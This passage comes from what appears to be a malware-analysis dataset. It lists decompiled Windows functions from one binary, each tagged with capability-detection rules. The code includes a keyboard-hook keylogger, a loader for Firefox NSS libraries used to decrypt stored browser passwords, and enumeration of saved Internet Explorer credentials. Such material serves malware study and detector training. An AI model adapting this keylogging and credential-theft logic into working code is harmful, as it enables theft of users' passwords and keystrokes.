        "decompiled_code": "\nuint __cdecl fcn.00087275(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t dwMoveMethod;\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t nNumberOfBytesToRead;\n    \n    if ((*in_ECX == 0) || (in_ECX[0xc] <= arg_8h && arg_8h != in_ECX[0xc])) {\n        uVar1 = 0;\n    }\n    else {\n        dwMoveMethod = in_ECX[0xb] * arg_8h;\n        nNumberOfBytesToRead = in_ECX[10] - dwMoveMethod;\n        if (nNumberOfBytesToRead < in_ECX[0xb]) {\n            uVar1 = fcn.0008d965(arg_ch, nNumberOfBytesToRead, dwMoveMethod);\n            arg_8h_00 = fcn.000859a9();\n            fcn.00082d5a(arg_8h_00, in_ECX[0xb] - nNumberOfBytesToRead);\n        }\n        else {\n            uVar1 = fcn.0008d965(arg_ch, in_ECX[0xb], dwMoveMethod);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 283
    },
    "000874d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000874d5(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int16_t iVar3;\n    uint in_ECX;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint lpString;\n    uint ARG_0;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    if ((in_EDX != 0x100) && (in_EDX != 0x104)) goto code_r0x0008790b;\n    uVar1 = *arg_8h;\n    if (uVar1 < 0x27) {\n        if (0x40 < uVar1) goto code_r0x000875b3;\ncode_r0x000875ff:\n        if (uVar1 < 0x67) {\n            if (uVar1 != 0x66) {\n                if (uVar1 < 0x21) {\n                    if (uVar1 != 0x20) {\n                        if (uVar1 < 0x12) {\n                            if (((uVar1 != 0x11) && (uVar1 != 8)) && ((uVar1 != 9 && (uVar1 != 0xd)))) {\n                                if (uVar1 == 0x10) goto code_r0x0008790b;\n                                goto code_r0x000878a2;\n                            }\n                        }\n                        else if (((uVar1 != 0x12) && (uVar1 != 0x14)) && (uVar1 != 0x1b)) goto code_r0x000878a2;\n                    }\n                }\n                else if (uVar1 < 99) {\n                    if (((uVar1 != 0x62) && (uVar1 != 0x2d)) &&\n                       ((uVar1 != 0x2e && ((uVar1 != 0x60 && (uVar1 != 0x61)))))) {\ncode_r0x000878a2:\n                        (*_sym.imp.USER32.dll_GetKeyNameTextW)\n                                  ((arg_8h[2] * 0x100 + arg_8h[1]) * 0x10000 + 1, &lpString, 0xf);\n                    }\n                }\n                else if (((uVar1 != 99) && (uVar1 != 100)) && (uVar1 != 0x65)) goto code_r0x000878a2;\n            }\n        }\n        else if (uVar1 < 0xbd) {\n            if (uVar1 == 0xbc) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 < 0xa4) {\n                if ((((uVar1 < 0xa2) && (uVar1 != 0x67)) && (uVar1 != 0x68)) && (uVar1 != 0x69)) {\n                    if (uVar1 - 0xa0 < 2) goto code_r0x0008790b;\n                    goto code_r0x000878a2;\n                }\n            }\n            else if (0xa5 < uVar1) {\n                if (uVar1 == 0xba) {\n                    (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                }\n                else {\n                    if (uVar1 != 0xbb) goto code_r0x000878a2;\n                    (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                }\n            }\n        }\n        else if (uVar1 < 0xdc) {\n            if (uVar1 == 0xdb) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbd) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbe) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbf) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else {\n                if (uVar1 != 0xc0) goto code_r0x000878a2;\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n        }\n        else if (uVar1 == 0xdc) {\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n        else if (uVar1 == 0xdd) {\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n        else {\n            if (uVar1 != 0xde) goto code_r0x000878a2;\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n    }\n    else {\n        if (0x40 < uVar1) {\ncode_r0x000875b3:\n            if (uVar1 < 0x5b) {\n                var_4h = in_ECX;\n                fcn.0008795b();\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                cVar2 = fcn.00087949();\n                uVar4 = uVar1 + 0x20;\n                if (cVar2 != '\\0') {\n                    uVar4 = uVar1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x92808, uVar4);\n                fcn.00087966();\n                in_ECX = var_4h;\n                goto code_r0x0008790b;\n            }\n            goto code_r0x000875ff;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        if (iVar3 == 0) {\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x92808, uVar1);\n        }\n        else {\n            if (9 < uVar1 - 0x30) goto code_r0x0008790b;\n    // switch table (10 cases) at 0x87921\n            switch(*((uVar1 - 0x30) * 4 + 0x87921)) {\n            case 0x8752f:\n                break;\n            case 0x87539:\n                break;\n            case 0x87543:\n                break;\n            case 0x8754d:\n                break;\n            case 0x87557:\n                break;\n            case 0x87561:\n                break;\n            case 0x8756b:\n                break;\n            case 0x87575:\n                break;\n            case 0x8757f:\n                break;\n            case 0x87589:\n            }\n        }\n    }\n    fcn.00087966();\ncode_r0x0008790b:\n    (*_sym.imp.USER32.dll_CallNextHookEx)(0, in_ECX, var_8h, arg_8h);\n    return;\n}\n",
        "token_count": 1576
    },
    "00087ec8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpKeyState\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.00087ec8(uint8_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint pwszBuff;\n    uint lpKeyState;\n    \n    fcn.00081052(&pwszBuff, 0, 0x100);\n    uVar2 = param_1;\n    uVar1 = (*_sym.imp.USER32.dll_MapVirtualKeyA)(uVar2, 0);\n    if (uVar2 < 0x5d) {\n        if (uVar2 < 0x5b) {\n            if (uVar2 < 0x15) {\n                if (uVar2 != 0x14) {\n                    if (uVar2 < 8) goto code_r0x00087f82;\n                    if ((9 < uVar2) && (uVar2 != 0xd)) {\n                        if (uVar2 < 0x10) goto code_r0x00087f82;\n                        bVar3 = uVar2 < 0x12;\n                        bVar4 = uVar2 == 0x12;\n                        goto code_r0x00087f22;\n                    }\n                }\n            }\n            else if ((uVar2 < 0x20) || ((0x28 < uVar2 && (uVar2 != 0x2e)))) goto code_r0x00087f82;\n        }\n    }\n    else if (uVar2 < 0xb4) {\n        if (uVar2 < 0xb2) {\n            if (uVar2 < 0x60) goto code_r0x00087f82;\n            if (0x69 < uVar2) {\n                if (uVar2 < 0xad) goto code_r0x00087f82;\n                bVar3 = uVar2 < 0xaf;\n                bVar4 = uVar2 == 0xaf;\ncode_r0x00087f22:\n                if (!bVar3 && !bVar4) goto code_r0x00087f82;\n            }\n        }\n    }\n    else if ((uVar2 < 0xba) || ((0xc0 < uVar2 && (3 < uVar2 - 0xdb)))) goto code_r0x00087f82;\n    uVar1 = uVar1 | 0x100;\ncode_r0x00087f82:\n    lpKeyState._0_1_ = (*_sym.imp.USER32.dll_GetKeyState)(uVar2);\n    (*_sym.imp.USER32.dll_ToUnicode)(uVar2, uVar1, &lpKeyState, &pwszBuff, 1, 0);\n    return &pwszBuff;\n}\n",
        "token_count": 631
    },
    "000883eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.000883eb(void)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x977c0);\n    if (*0x96d98 != 0) {\n        fcn.00081eb9();\n        *0x96d98 = 0;\n        fcn.00081e8e(fcn.00087376, 0x96d98);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x977c0);\n    return;\n}\n",
        "token_count": 110
    },
    "00088431": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00088431(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n    puVar2 = &lpCriticalSection;\n    puVar3 = 0x977c0;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x977c0);\n    *0x977e8 = arg_8h;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    *0x966ac = 0x96d98;\n    if (arg_ch == 0) {\n        fcn.00081eb9();\n        *0x96d98 = 1;\n        fcn.00081e8e(fcn.000880aa, 0x96d98);\n    }\n    else {\n        fcn.00081e8e(fcn.00087376, 0x96d98);\n        *0x977ac = 1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x977c0);\n    return;\n}\n",
        "token_count": 343
    },
    "00089d15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __fastcall fcn.00089d15(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint uStack88;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    var_ch = 0;\n    var_28h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    var_4h = 0;\n    var_50h = 0;\n    iVar1 = fcn.0008a06b();\n    if ((((iVar1 != 0) && (iVar1 = (**(param_1 + 0x84))(0x96140, 0, &var_ch),  iVar1 == 0)) &&\n        (iVar1 = (**(param_1 + 0x8c))(var_ch, 0x200, &var_28h, &var_10h),  iVar1 == 0)) && (var_28h != 0)) {\n        var_4ch = 0;\n        var_24h = 0;\n        var_20h = 0;\n        do {\n            iVar1 = fcn.0008a038();\n            if (iVar1 == 0) {\n                var_18h = var_10h + var_24h;\n                iVar1 = fcn.00081000(iVar3, 0x96130, 0x10);\n                if (iVar1 == 0) {\n                    fcn.000833ab(*(var_18h + 0x10));\n                    uVar2 = fcn.000833ab(L\"Internet Explorer\");\n                    iVar1 = fcn.0008300e(uVar2);\n                    fcn.000858fb();\n                    iVar3 = var_4h;\n                    var_3ch = 0;\n                    if (iVar1 != 0) {\n                        var_60h = *0x947c0;\n                        var_5ch = *0x947c4;\n                        var_58h = *0x947c8;\n                        uStack88 = *0x947cc;\n                        uVar2 = fcn.000833ab(*(var_4h + 0x14) + 0x20);\n                        fcn.000831fd(uVar2);\n                        fcn.000858fb();\n                        var_40h = 0;\n                        uVar2 = fcn.000833ab(*(iVar3 + 0x18) + 0x20);\n                        fcn.000831fd(uVar2);\n                        fcn.000858fb();\n                        var_8h = 0;\n                        var_44h = 0;\n                        iVar3 = (**(param_1 + 0x90))\n                                          (var_ch, var_18h, *(var_18h + 0x14), *(var_18h + 0x18), 0, 0, 0, &var_8h);\n                        if (iVar3 == 0) {\n                            var_4h = var_8h;\n                            var_60h = *(var_18h + 0x1c) + 0x20;\n                            var_5ch = fcn.000833ab(var_60h);\n                            fcn.000831fd(var_5ch);\n                            fcn.000858fb();\n                            var_48h = 0;\n                        }\n                        puVar4 = &var_60h;\n                        fcn.00081ed8(puVar4);\n                        fcn.00081f0e(puVar4);\n                        fcn.0008138f();\n                    }\n                    fcn.000858fb();\n                    var_1ch = 0;\n                    iVar3 = var_4h;\n                }\n            }\n            else {\n                iVar3 = var_20h + var_10h;\n                var_4h = iVar3;\n                iVar1 = fcn.00081000(iVar3, 0x96130, 0x10);\n                if (iVar1 == 0) {\n                    fcn.000833ab(*(iVar3 + 0x10));\n                    uVar2 = fcn.000833ab(L\"Internet Explorer\");\n                    iVar1 = fcn.0008300e(uVar2);\n                    fcn.000858fb();\n                    iVar3 = var_4h;\n                    var_2ch = 0;\n                    if (iVar1 != 0) {\n                        var_60h = *0x947c0;\n                        var_5ch = *0x947c4;\n                        var_58h = *0x947c8;\n                        uStack88 = *0x947cc;\n                        uVar2 = fcn.000833ab(*(var_4h + 0x14) + 0x20);\n                        fcn.000831fd(uVar2);\n                        fcn.000858fb();\n                        var_30h = 0;\n                        uVar2 = fcn.000833ab(*(iVar3 + 0x18) + 0x20);\n                        fcn.000831fd(uVar2);\n                        fcn.000858fb();\n                        var_8h = 0;\n                        var_34h = 0;\n                        iVar3 = (**(param_1 + 0x90))(var_ch, iVar3, *(iVar3 + 0x14), *(iVar3 + 0x18), 0, 0, 0, &var_8h);\n                        if (iVar3 == 0) {\n                            var_4h = var_8h;\n                            var_60h = *(var_8h + 0x1c) + 0x20;\n                            var_5ch = fcn.000833ab(var_60h);\n                            fcn.000831fd(var_5ch);\n                            fcn.000858fb();\n                            var_38h = 0;\n                        }\n                        puVar4 = &var_60h;\n                        fcn.00081ed8(puVar4);\n                        fcn.00081f0e(puVar4);\n                        fcn.0008138f();\n                    }\n                    fcn.000858fb();\n                    var_14h = 0;\n                    iVar3 = var_4h;\n                }\n            }\n            var_20h = var_20h + 0x38;\n            var_4ch = var_4ch + 1;\n            var_24h = var_24h + 0x34;\n        } while (var_4ch < var_28h);\n    }\n    if (var_10h != 0) {\n        (**(param_1 + 0x98))(var_10h);\n    }\n    if (var_ch != 0) {\n        (**(param_1 + 0x88))(&var_ch);\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(*(param_1 + 0xb8));\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 1737
    },
    "0008a50c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0008a50c(uint lpPathName, char *pszPath)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    char *pcVar6;\n    char *pcVar7;\n    uint lpBuffer;\n    uint var_c30h;\n    uint var_a30h;\n    uint var_830h;\n    uint var_630h;\n    uint var_430h;\n    uint var_230h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    fcn.00081052(&lpBuffer, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x104, &lpBuffer);\n    if ((pszPath == 0x1) &&\n       ((((*(in_ECX + 0xb0) == 0 || (*(in_ECX + 0xa4) == 0)) || (*(in_ECX + 0xa8) == 0)) ||\n        (((*(in_ECX + 0xb4) == 0 || (*(in_ECX + 0x9c) == 0)) || (*(in_ECX + 0xac) == 0)))))) {\n        fcn.00081052(&var_830h, 0, 0x100);\n        fcn.00081052(&var_230h, 0, 0x100);\n        fcn.00081052(&var_630h, 0, 0x100);\n        fcn.00081052(&var_430h, 0, 0x100);\n        fcn.00081052(&var_c30h, 0, 0x100);\n        fcn.00081052(&var_a30h, 0, 0x100);\n        var_20h = 0;\n        var_1ch = 0;\n        var_28h = 0;\n        var_2ch = 0;\n        var_30h = 0;\n        var_24h = 0;\n        iVar3 = (*_sym.imp.WININET.dll_InternetCheckConnectionW)(L\"http://www.google.com\", 1, 0);\n        if (iVar3 == 0) goto code_r0x0008ab09;\n        var_14h = fcn.0008f445();\n        var_18h = fcn.0008f445();\n        var_ch = fcn.0008f445();\n        var_8h = fcn.0008f445();\n        pszPath = fcn.0008f445();\n        var_10h = fcn.0008f445();\n        pcVar1 = _sym.imp.KERNEL32.dll_GetTempPathW;\n        (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x100, &var_a30h);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcatW;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_a30h, L\"softokn3.dll\");\n        (*pcVar1)(0x100, &var_230h);\n        (*pcVar2)(&var_230h, L\"msvcp140.dll\");\n        (*pcVar1)(0x100, &var_630h);\n        (*pcVar2)(&var_630h, L\"mozglue.dll\");\n        (*pcVar1)(0x100, &var_430h);\n        (*pcVar2)(&var_430h, L\"vcruntime140.dll\");\n        (*pcVar1)(0x100, &var_c30h);\n        (*pcVar2)(&var_c30h, L\"freebl3.dll\");\n        (*pcVar1)(0x100, &var_830h);\n        (*pcVar2)(&var_830h, L\"nss3.dll\");\n        pcVar6 = var_10h;\n        pcVar7 = var_18h;\n        if (var_14h != NULL) {\n            if (((var_18h != NULL) && (var_ch != NULL)) &&\n               ((var_8h != NULL && ((pszPath != NULL && (var_10h != NULL)))))) {\n                if ((*var_14h == 'M') && (var_14h[1] == 'Z')) {\n                    fcn.0008f52a(var_20h);\n                }\n                else {\n                    var_14h = NULL;\n                }\n                if ((*pcVar7 == 'M') && (pcVar7[1] == 'Z')) {\n                    fcn.0008f52a(var_1ch);\n                }\n                else {\n                    pcVar7 = NULL;\n                    var_18h = NULL;\n                }\n                if ((*var_ch == 'M') && (var_ch[1] == 'Z')) {\n                    fcn.0008f52a(var_28h);\n                }\n                else {\n                    var_ch = NULL;\n                }\n                if ((*var_8h == 'M') && (var_8h[1] == 'Z')) {\n                    fcn.0008f52a(var_2ch);\n                }\n                else {\n                    var_8h = NULL;\n                }\n                if ((*pszPath == 'M') && (pszPath[1] == 'Z')) {\n                    fcn.0008f52a(var_30h);\n                }\n                else {\n                    pszPath = NULL;\n                }\n                if ((*pcVar6 == 'M') && (pcVar6[1] == 'Z')) {\n                    fcn.0008f52a(var_24h);\n                }\n                else {\n                    pcVar6 = NULL;\n                    var_10h = NULL;\n                }\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n            if (((((var_14h != NULL) && (pcVar7 != NULL)) && (var_ch != NULL)) &&\n                ((var_8h != NULL && (pszPath != NULL)))) && (pcVar6 != NULL)) {\n                uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(&var_230h);\n                *(var_4h + 0xa4) = uVar4;\n                uVar4 = (*pcVar1)(&var_430h);\n                *(var_4h + 0xb4) = uVar4;\n                uVar4 = (*pcVar1)(&var_630h);\n                *(var_4h + 0xa8) = uVar4;\n                uVar4 = (*pcVar1)(&var_830h);\n                *(var_4h + 0xac) = uVar4;\n                uVar4 = (*pcVar1)(&var_a30h);\n                *(var_4h + 0xb0) = uVar4;\n                uVar4 = (*pcVar1)(&var_c30h);\n                *(var_4h + 0x9c) = uVar4;\n            }\n        }\n        fcn.000858fb();\n        fcn.000858fb();\n        fcn.000858fb();\n        fcn.000858fb();\n        fcn.000858fb();\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(lpPathName);\n        fcn.00083230(0x92464);\n        fcn.000833f3(&lpPathName);\n        fcn.00083230(L\"nss3.dll\");\n        fcn.000833f3(&lpPathName);\n        fcn.00083230(L\"msvcr120.dll\");\n        fcn.000833f3(&lpPathName);\n        fcn.00083230(L\"msvcp120.dll\");\n        fcn.000833f3(&lpPathName);\n        fcn.00083230(L\"mozglue.dll\");\n        fcn.000833f3(&lpPathName);\n        fcn.00083230(L\"softokn3.dll\");\n        fcn.000833f3(&lpPathName);\n        fcn.00083230(L\"vcruntime140.dll\");\n        fcn.000833f3(&lpPathName);\n        fcn.00083230(L\"msvcp\");\n        fcn.000833f3(&lpPathName);\n        fcn.00083230(L\"msvcr\");\n        iVar3 = 0x5a;\n        var_14h = 0x5a;\n        do {\n            fcn.000833f3(&var_8h);\n            uVar4 = 0x92d04;\n            iVar5 = iVar3;\n            fcn.00083038(iVar3);\n            fcn.00083230(iVar5);\n            iVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar5, uVar4);\n            if (iVar5 != 0) {\n                fcn.000831fd(&pszPath);\n                fcn.000858fb();\n                break;\n            }\n            iVar3 = iVar3 + 10;\n            fcn.000858fb();\n            pszPath = NULL;\n        } while (iVar3 != 0x96);\n        do {\n            fcn.000833f3(&var_18h);\n            uVar4 = 0x92d04;\n            pcVar7 = var_14h;\n            fcn.00083038(var_14h);\n            fcn.00083230(pcVar7);\n            iVar3 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, pcVar7, uVar4);\n            if (iVar3 != 0) {\n                fcn.000831fd(&pszPath);\n                fcn.000858fb();\n                break;\n            }\n            var_14h = var_14h + 10;\n            fcn.000858fb();\n            pszPath = NULL;\n        } while (var_14h != 0x96);\n        pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n        uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(var_4h);\n        *(in_ECX + 0xb4) = uVar4;\n        uVar4 = (*pcVar1)(var_ch);\n        *(in_ECX + 0xa0) = uVar4;\n        uVar4 = (*pcVar1)(var_10h);\n        *(in_ECX + 0xa4) = uVar4;\n        uVar4 = (*pcVar1)(var_1ch);\n        *(in_ECX + 0xa8) = uVar4;\n        uVar4 = (*pcVar1)(var_20h);\n        *(in_ECX + 0xac) = uVar4;\n        fcn.000858fb();\n        fcn.000858fb();\n        fcn.000858fb();\n        fcn.000858fb();\n        fcn.000858fb();\n        fcn.000858fb();\n        fcn.000858fb();\n        var_4h = in_ECX;\n    }\n    fcn.000858fb();\n    in_ECX = var_4h;\ncode_r0x0008ab09:\n    iVar3 = *(in_ECX + 0xac);\n    if (iVar3 != 0) {\n        uVar4 = fcn.0008e579(iVar3);\n        *(in_ECX + 0x60) = uVar4;\n        uVar4 = fcn.0008e579();\n        *(in_ECX + 0x78) = uVar4;\n        uVar4 = fcn.0008e579();\n        *(in_ECX + 0x74) = uVar4;\n        uVar4 = fcn.0008e579();\n        *(in_ECX + 0x68) = uVar4;\n        uVar4 = fcn.0008e579();\n        *(in_ECX + 0x6c) = uVar4;\n        uVar4 = fcn.0008e579();\n        *(in_ECX + 0x70) = uVar4;\n        uVar4 = fcn.0008e579();\n        *(in_ECX + 100) = uVar4;\n        uVar4 = fcn.0008e579();\n        *(in_ECX + 0x7c) = uVar4;\n        uVar4 = fcn.0008e579();\n        *(in_ECX + 0x80) = uVar4;\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(&lpBuffer);\n    }\n    fcn.000858fb();\n    return iVar3 != 0;\n}\n",
        "token_count": 2852
    },
    "0008ac7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008ac7c(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uchar *arg_8h_00;\n    uint uVar2;\n    uchar *arg_8h_01;\n    uint uVar3;\n    uchar *arg_8h_02;\n    uint uStack88;\n    uchar auStack64 [4];\n    int32_t iStack60;\n    uchar auStack52 [48];\n    \n    uStack88 = 0x8ac9c;\n    fcn.00090ce2(&stack0xffffffcc, arg_8h[2], 0);\n    if (iStack60 != 0) {\n        arg_8h_02 = &stack0xffffffc0;\n        uVar2 = extraout_ECX;\n        uStack88 = extraout_ECX;\n        fcn.00082e12(arg_8h_02);\n        fcn.00088ad4(arg_8h_02);\n        iVar1 = fcn.00088afb(arg_8h_02, uVar2);\n        if (iVar1 != 0) {\n            fcn.0008d51c();\n            fcn.0008d51c();\n            fcn.0008adbb();\n            fcn.00089d15();\n            fcn.00088bf6();\n            arg_8h_01 = &stack0xffffffac;\n            uVar3 = extraout_ECX_00;\n            fcn.000833f3(arg_8h_01);\n            fcn.000891e6(arg_8h_01);\n            arg_8h_00 = &stack0xffffffa8;\n            uVar2 = extraout_ECX_01;\n            fcn.000833f3(arg_8h_00);\n            fcn.00089722(arg_8h_00);\n            fcn.00088a92(arg_8h_00, uVar2, arg_8h_01, uVar3);\n            fcn.00081fd6(*arg_8h);\n            fcn.00081fd6(&stack0xffffffa8);\n            fcn.00084a3d(&stack0xffffffb4);\n            fcn.00090a3b();\n            if (arg_8h_02 != NULL) {\n                fcn.00081a1e(arg_8h_02);\n            }\n            if (*(*arg_8h + 0x10) != 0) {\n                fcn.000858fb();\n            }\n            fcn.000858fb();\n            fcn.000858fb();\n        }\n        fcn.00085944();\n        fcn.00081eb9();\n    }\n    fcn.00082dff();\n    return 0;\n}\n",
        "token_count": 626
    },
    "0008b2c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008b2c2(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint hostshort;\n    uint uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = in_ECX + 0xf6;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    uVar4 = extraout_ECX;\n    if (in_ECX[0x7b] == 0) {\n        uVar6 = *(arg_8h + 0xc);\n        iVar5 = arg_8h + 8;\n        hostshort = extraout_ECX;\n        fcn.000831bb(iVar5);\n        iVar3 = fcn.00085294(iVar5, hostshort);\n        uVar4 = extraout_ECX_00;\n        if (iVar3 != 0) goto code_r0x0008b303;\ncode_r0x0008b321:\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1, iVar5, hostshort, uVar6);\n        uVar4 = 1;\n    }\n    else {\ncode_r0x0008b303:\n        if (in_ECX[3] == 0) {\n            uVar6 = *(arg_8h + 4);\n            fcn.000831bb(arg_8h);\n            iVar3 = fcn.00085294(arg_8h, uVar4);\n            iVar5 = arg_8h;\n            hostshort = uVar4;\n            if (iVar3 == 0) goto code_r0x0008b321;\n        }\n        iVar5 = fcn.000820d3(0);\n        if (iVar5 == 0) {\n            fcn.00081eb9();\n        }\n        iVar5 = fcn.000820d3(0);\n        if (iVar5 == 0) {\n            fcn.00081eb9();\n        }\n        var_8h = in_ECX[4];\n        var_4h = in_ECX[0x7c];\n        fcn.00081e8e(fcn.0008b1e8, &var_8h);\n        fcn.00081e8e(fcn.0008b255, &var_8h);\n        pcVar2 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n        *in_ECX = 1;\n        (*pcVar2)(puVar1);\n        fcn.000820d3(0xffffffff);\n        fcn.000820d3(0xffffffff);\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n        *in_ECX = 0;\n        (*pcVar2)(puVar1);\n        fcn.0008b46d();\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 678
    },
    "0008b3f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
